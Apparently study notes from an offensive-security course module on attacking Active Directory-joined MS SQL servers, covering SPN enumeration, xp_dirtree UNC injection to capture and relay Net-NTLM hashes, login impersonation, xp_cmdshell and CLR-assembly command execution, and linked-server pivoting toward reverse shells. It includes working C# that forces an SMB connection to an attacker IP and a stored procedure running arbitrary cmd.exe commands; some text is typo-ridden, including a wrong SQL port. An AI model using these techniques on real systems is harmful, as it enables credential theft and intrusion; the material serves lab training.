# MS SQL attacks

How to compromise MS SQL that is typically integrated with Active directory.

# MS SQL in Active Directory

precondition - we already have underprivileged shell
we want to know what kind of access an unprivileged domain user has to a kerberos MS SQL server

# MS SQL Enumeration

we do it through nmap. commonly sql is on port 1443

in AD normally the service is associated with a Service princiipal Name. stored in active directory

we can query the domain controller for all registered SPNs related to MS SQL.

If we have compromised a domain joined workstation in context of of domain user, we can query through setspn tool

` setspn -T corp1 -Q MSSQLSvc/*`

GetUserSPNs.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

### 15.1.1.1 Exercise
1. Perform enumeration through SPNs to locate MS SQL databases in the domain

# ms sql authentication

happens over local user or through kerberos authentication with (TGS) system

sql roles - sysadmin admin of SQL server

C# application which creates authentication against the SQL server running on dc01.

### 15.1.2.1 Exercises
1. Execute the code to authenticate to the SQL server on dc01 as shown in this section.
2. Complete the C# implementation that fetches the SQL login, username, and role 
memberships.

# UNC path injection

we we force SQL to connect to an USB share we cpmtrp;

If we use our unprivileged access in the database to execute the xp_dirtree procedure, the service 
account of the SQL server will attempt to list the contents of a given SMB share. A SMB share is 
typically supplied with a Universal Naming Convention (UNC)903 path, which has the following 
format.

```
using System;
using System.Data.SqlClient;
namespace SQL
{
 class Program
 {
 static void Main(string[] args)
 {
 String sqlServer = "dc01.corp1.com";
 String database = "master";
 String conString = "Server = " + sqlServer + "; Database = " + database + 
"; Integrated Security = True;";
 SqlConnection con = new SqlConnection(conString);
 
 try
 {
 con.Open();
 Console.WriteLine("Auth success!");
 }
 catch
 {
 Console.WriteLine("Auth failed");
 Environment.Exit(0);
 }
 String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
 SqlCommand command = new SqlCommand(query, con);
 SqlDataReader reader = command.ExecuteReader();
 reader.Close();
 
 con.Close();
 }
 }
}
```
The SQL query to invoke xp_dirtree contains a number of backslashes, both to escape the double 
quote required by the SQL query and to escape the backslashes in the UNC path as required by 
C# strings.
Many other SQL procedures can be used to initiate the connection if xp_dirtree
has been removed for security reasons.905

Now we must set up a SMB share that will initiate NTLM authentication when the SQL service 
account performs the connection. An easy way to do this is by using Responder,
906 which comes 
pre-installed on Kali.
We’ll need to shut down the Samba share used with Visual Studio before starting Responder. 
Once that is done, we can launch responder and specify the VPN connection network interface 
(-I).

sudo reponder -I tap0

The hash obtained by Responder is called a Net-NTLM907 hash or sometimes NTLMv2. Before we 
continue, let’s quickly review the difference between NTLM and Net-NTLM.
As covered in a previous module, Windows user account passwords are stored locally as NTLM 
hashes. When authentication with the NTLM protocol takes place over the network, a challenge 
and response is created based on the NTLM hash. The resulting hash is called Net-NTLM and it 
represents the same clear text password as the NTLM hash.
A Net-NTLM hash based on a weak password can be cracked and reveal the clear text password, 
just like with a NTLM hash.
In this example, we attempt to crack the hash with hashcat908 by copying the hash into a file 
(hash.txt). 

### 15.1.3.1 Exercises
1. Create the C# code that will trigger a connection to a SMB share.
2. Capture the Net-NTLM hash with Responder.
3. Crack the password hash for SQLSVC and gain access to appsrv01 and dc01

# Relay my hash

If we have captured the NTLM hash of a domain user that is a local administrator on a remote 
machine, we can perform a pass-the-hash attack and gain remote code execution.
However, the Net-NTLM hash cannot be used in a pass-the-hash attack, but we can relay it to a 
different computer. If the user is a local administrator on the target, we can obtain code 
execution.

using impacket
powershell - powershell on kali

### 15.1.4.1 Exercises
1. Install Impacket, prepare the PowerShell shellcode runner, and Base64 encode the 
PowerShell download cradle.
2. Launch ntlmrelayx to relay the Net-NTLM hash from dc01 to appsrv01 and set up a 
multi/handler in Metasploit.
3. Execute the attack by triggering a connection from the SQL server to SMB on the Kali 
machine and obtain a reverse shell from appsrv01

# MS SQL Escalation

# Privilege escalation

The most obvious and easy way to obtain higher privileges in the database would be to 
authenticate with a user that has sysadmin role membership.

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals 
b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
Listing 745 - Enumerating login impersonation permissions
This query uses information from the sys.server_permissions table,914 which contains information 
related to permissions, and the sys.server_principals table,915 which contains information about 
logins on the server.

### 15.2.1.1 Exercises
1. Perform enumeration of login impersonation in dc01.
2. Impersonate the sa login on dc01.
3. Impersonate the dbo user in msdb on dc01

# Getting code execution

With sysadmin role membership, it’s possible to obtain code execution on the Windows server 
hosting the SQL database. The most well-known way of doing this is by using the xp_cmdshell917
stored procedure.
We are going to cover this technique, keeping in mind that because it is well known, we may find 
that xp_cmdshell is blocked or monitored. For this reason, we’ll also cover an alternative 
technique, which uses the sp_OACreate918 stored procedure. For now, let’s begin with 
xp_cmdshell.
The xp_cmdshell stored procedure spawns a Windows command shell and passes in a string that 
is then executed. The output of the command is returned by the procedure. Since arbitrary 
command execution is dangerous, xp_cmdshell has been disabled by default since Microsoft SQL 
2005

sp_OAMethod accepts the name of the procedure to execute (@myshell), the method of the OLE
object (run), an optional output variable, and any parameters for the invoked method. Therefore, 
we will send the command we want to execute as a parameter.
It is not possible to obtain the results from the executed command because of 
the local scope of the @myshell variable

### 15.2.2.1 Exercises
1. Use xp_cmdshell to get a reverse Meterpreter shell on dc01.
2. Use sp_OACreate and sp_OAMethod to obtain a reverse Meterpreter shell on dc01

# custom assemblies

In the previous section, we covered two techniques for gaining code execution from stored 
procedures. In this section, we are going to explore a different technique that also allows us to get 
arbitrary code execution, this time using managed code.
Before we begin, let’s discuss this technique. If a database has the TRUSTWORTHY property set, 
it’s possible to use the CREATE ASSEMBLY924 statement to import a managed DLL as an object 
inside the SQL server and execute methods within it. To take advantage of this, we will need to 
perform several steps. Let’s do that one at a time.
To begin, we will create a managed DLL by creating a new “Class Library (.NET Framework)” 
project.
As part of the C# code, we create a method (cmdExec) that must be marked as a stored 
procedure

```C#
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;


public class StoredProcedures
{
 [Microsoft.SqlServer.Server.SqlProcedure]
 public static void cmdExec (SqlString execCommand)
 {
 Process proc = new Process();
 proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
 proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
 proc.StartInfo.UseShellExecute = false;
 proc.StartInfo.RedirectStandardOutput = true;
 proc.Start();
 SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", 
System.Data.SqlDbType.NVarChar, 4000));
 SqlContext.Pipe.SendResultsStart(record);
 record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
 SqlContext.Pipe.SendResultsRow(record);
 SqlContext.Pipe.SendResultsEnd();
 proc.WaitForExit();
 proc.Close();
 }
};
```

### 15.2.3.1 Exercises
1. Repeat the steps to obtain command execution through the custom assembly.
2. Leverage the technique to obtain a reverse shell.


# Linked sql servers

So far, we have exclusively dealt with the SQL server on dc01. As we discovered during 
enumeration, there is also a SQL server instance on appsrv01. It is possible to link multiple SQL 
servers945 together in such a way that a query executed on one SQL server fetches data or 
performs an action on a different SQL server

# follwo the link

### 15.3.1.1 Exercises
1. Enumerate linked SQL servers from appsrv01.
2. Implement the code required to enable and execute xp_cmdshell on dc01 and obtain a 
reverse shell.
### 15.3.1.2 Extra Mile
While Microsoft documentation specifies that execution of stored procedures is not supported on 
linked SQL servers with the OPENQUERY keyword, it is actually possible.
Modify the SQL queries to obtain code execution on dc01 using OPENQUERY instead of AT

# come home to me

### 15.3.2.1 Exercises
1. Repeat the enumeration steps to find the login security context after following the link first to 
dc01 and then back to appsrv01.
2. Obtain a reverse shell on appsrv01 by following the links.
### 15.3.2.2 Extra Mile
A PowerShell script called PowerUpSQL952 exists that can help automate all the enumerations and 
attacks we have performed in this module.
A C# implementation of PowerUpSQL called Database Audit Framework & Toolkit (DAFT)953 also 
exists.
Download and use either of them to access, elevate, and own the two SQL servers


